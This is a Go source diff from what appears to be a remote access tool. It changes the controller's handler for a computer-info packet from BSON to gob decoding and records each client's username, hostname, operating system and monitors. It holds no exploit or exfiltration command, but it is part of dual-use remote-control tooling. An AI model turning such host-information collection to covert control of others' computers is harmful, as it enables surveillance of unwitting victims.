@@ -1,10 +1,10 @@
 package main
 
 import (
+	"encoding/gob"
 	"fmt"
+	"io"
 	"rat/shared"
-
-	"gopkg.in/mgo.v2/bson"
 )
 
 type ComputerInfoPacket struct {
@@ -17,7 +17,14 @@ type ComputerInfoPacket struct {
 	Monitors []shared.Monitor
 }
 
-func (packet ComputerInfoPacket) OnReceive(c *Client) error {
+func (packet ComputerInfoPacket) Read(r io.ReadWriter, c *Client) error {
+	dec := gob.NewDecoder(r)
+	err := dec.Decode(&packet)
+
+	if err != nil {
+		return err
+	}
+
 	c.Computer.Username = packet.Username
 	c.Computer.Hostname = packet.Hostname
 	c.Computer.OperatingSystemType = packet.OperatingSystem.Type
@@ -32,9 +39,4 @@ func (packet ComputerInfoPacket) OnReceive(c *Client) error {
 	}
 
 	return nil
-}
-
-func (packet ComputerInfoPacket) Decode(buf []byte) (IncomingPacket, error) {
-	err := bson.Unmarshal(buf, &packet)
-	return packet, err
 }
